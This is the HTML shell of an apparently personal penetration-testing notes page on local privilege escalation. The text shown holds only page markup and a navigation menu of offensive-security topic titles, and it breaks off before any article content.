
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Infosec-Notes">
      
      
        <meta name="author" content="julianhal">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.0, mkdocs-material-8.5.3">
    
    
      
        <title>Local Privilige Escalation - Notes</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.7a952b86.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
        
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#privilege-escalation-windows" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      <div data-md-component="outdated" hidden>
        
      </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Notes" class="md-header__button md-logo" aria-label="Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Notes
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Local Privilige Escalation
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/julianhal/notes" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Notes
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/julianhal/notes" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Documentation
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          Basics of Linux
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Basics of Linux" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Basics of Linux
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_linux/linux/" class="md-nav__link">
        Linux
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_linux/basics_of_linux/" class="md-nav__link">
        Basics of Linux
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_linux/bash_scripting/" class="md-nav__link">
        Bash Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_linux/vim/" class="md-nav__link">
        Vim
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_linux/common_devices_and_components/" class="md-nav__link">
        Common Devices and Components
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          Basics of Windows
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Basics of Windows" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Basics of Windows
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_windows/basics_of_windows/" class="md-nav__link">
        Basics of Windows
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_windows/powershell/" class="md-nav__link">
        Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_windows/powershell_scripting2/" class="md-nav__link">
        Powershell Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_windows/cmd/" class="md-nav__link">
        CMD
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basics_of_windows/default_windows_files/" class="md-nav__link">
        Default Windows Files
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Python
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Python" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Python
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../python/python_fundamentals/" class="md-nav__link">
        Python Fundamentals
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../python/useful_python_commands/" class="md-nav__link">
        Useful Scripts
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Basic Hardening
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Basic Hardening" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Basic Hardening
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basic_hardening/hardening_bios/" class="md-nav__link">
        Hardening Bios
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../basic_hardening/hardening_linux/" class="md-nav__link">
        Hardening Linux
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Recon
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Recon" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Recon
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../recon/google_hacking/" class="md-nav__link">
        Google Hacking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../recon/passive_information_gathering/" class="md-nav__link">
        Passive Information Gathering
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../recon/port_scanning/" class="md-nav__link">
        Port Scanning
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../recon/finding_subdomains/" class="md-nav__link">
        Finding Subdomains
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          Initial Access
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Initial Access" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Initial Access
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial_access/phishing_server/" class="md-nav__link">
        Setting Up Email-phishing-server
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial_access/social_engineering_-_phishing/" class="md-nav__link">
        Social Engineering and Phishing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial_access/initial_access/" class="md-nav__link">
        Initial Access
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial_access/initial_access_dropper/" class="md-nav__link">
        Initial Dropper
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../initial_access/reverse_shell/" class="md-nav__link">
        Generate Payload - Reverse shells
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          Post Exploitation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Post Exploitation" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Post Exploitation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../post_exploitation/spawning_shells/" class="md-nav__link">
        Spawning Shells
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../post_exploitation/getting_meterpreter_shell/" class="md-nav__link">
        Meterpreter for Post-exploitation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../post_exploitation/privilege_escalation_-_linux/" class="md-nav__link">
        Local Privilege Escalation - Linux
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
      
      
      
      
        <label class="md-nav__link" for="__nav_9">
          Transferring Files
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Transferring Files" data-md-level="1">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          Transferring Files
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../transferring_files/transfering_files/" class="md-nav__link">
        Transferring Files Linux
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
      
      
      
      
        <label class="md-nav__link" for="__nav_10">
          Attacking Web Applications
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Web Applications" data-md-level="1">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          Attacking Web Applications
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/oauth_attacks/" class="md-nav__link">
        OAuth Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/bankid_attacks/" class="md-nav__link">
        BankID Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/cache_poisoning/" class="md-nav__link">
        Cache Poisoning
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/csv_injection/" class="md-nav__link">
        CSV Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/cross_site_web_socket_hijack/" class="md-nav__link">
        Cross-Site Web Socket Hijack (CSHSH)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/deserialization_attacks/" class="md-nav__link">
        Deserialization Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/dom_based_xss/" class="md-nav__link">
        DOM XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/local_file_inclusion/" class="md-nav__link">
        Local File Inclusion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/static_analysis_of_javascript/" class="md-nav__link">
        Static Analysis of JavaScript
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/sql-injections/" class="md-nav__link">
        SQL Injections
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/xml_external_entity_attack/" class="md-nav__link">
        XML External Entity (XXE)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/subdomain_takeover/" class="md-nav__link">
        Subdomain Takerovers
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/session-fixation/" class="md-nav__link">
        Session Fixation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/remote_file_inclusion/" class="md-nav__link">
        Remote File Inclusion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/nosql-injections/" class="md-nav__link">
        NoSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/host-header-attack/" class="md-nav__link">
        Host-header Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/bypass_image_upload/" class="md-nav__link">
        Bypassing File Upload
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/cross_site_request_forgery/" class="md-nav__link">
        Cross-site Request Forgery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/cross-site-scripting/" class="md-nav__link">
        Cross-site Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_web_applications/web-scanning/" class="md-nav__link">
        Find Files
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_11">
          Attacking Internal Network
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Internal Network" data-md-level="1">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          Attacking Internal Network
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/network_attacks/" class="md-nav__link">
        Network Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/dns_zone_transfer_attack/" class="md-nav__link">
        Zone Transfer Attack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/basics_of_networking/" class="md-nav__link">
        Basics of Networking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/active_information_gathering/" class="md-nav__link">
        Active Information Gathering
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/arp-spoofing/" class="md-nav__link">
        ARP Spoofing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/infrastructure_pentest_scanning_networks/" class="md-nav__link">
        Scanning Networks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/list_of_common_ports/" class="md-nav__link">
        List of Common Ports
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
      
      
      
      
        <label class="md-nav__link" for="__nav_12">
          Attacking External Network
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking External Network" data-md-level="1">
        <label class="md-nav__title" for="__nav_12">
          <span class="md-nav__icon md-icon"></span>
          Attacking External Network
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_external_network/attacking_external_networks/" class="md-nav__link">
        Attacking External Networks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../attacking_internal_network/list_of_common_ports/" class="md-nav__link">
        List of Common Ports
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_13">
          Attacking Active Directory
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Attacking Active Directory" data-md-level="1">
        <label class="md-nav__title" for="__nav_13">
          <span class="md-nav__icon md-icon"></span>
          Attacking Active Directory
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_1" type="checkbox" id="__nav_13_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_1">
          Active Directory - Good to Know
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Good to Know" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_1">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Good to Know
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/active_directory_help_commands/" class="md-nav__link">
        Helpful Commands and Scripts
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/transferring_files/" class="md-nav__link">
        Transferring Files
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/tools/" class="md-nav__link">
        Tools
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/neo4j_and_cypher/" class="md-nav__link">
        Neo4J and Cypher
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/ldap_syntax/" class="md-nav__link">
        LDAP Syntax
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../good_to_know/windows_access_control/" class="md-nav__link">
        Windows Access Control
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_2" type="checkbox" id="__nav_13_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_2">
          Active Directory - Basics of Active Directory
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Basics of Active Directory" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_2">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Basics of Active Directory
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/about_active_directory/" class="md-nav__link">
        About Active Directory
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/domain_controller/" class="md-nav__link">
        Domain Controller
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/kerberos/" class="md-nav__link">
        Kerberos
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/group_policies/" class="md-nav__link">
        Group Policies
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/ad_physical_topology/" class="md-nav__link">
        AD Physical topology
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../understanding_active_directory/default_groups/" class="md-nav__link">
        Default Groups
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_3" type="checkbox" id="__nav_13_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_3">
          Active Directory - Reconnaissance
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Reconnaissance" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_3">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Reconnaissance
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../recon/active_directory_recon/" class="md-nav__link">
        Reconnaissance
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13_4" type="checkbox" id="__nav_13_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_13_4">
          Active Directory - Initial Access
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Active Directory - Initial Access" data-md-level="2">
        <label class="md-nav__title" for="__nav_13_4">
          <span class="md-nav__icon md-icon"></span>
          Active Directory - Initial Access
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../initial_access/llmnr_and_nbtns_poisoning/" class="md-nav__link">
        LLMNR and NBT-NS Poisoning
      </a>
    </li>
  

            
          
            
              
  
  
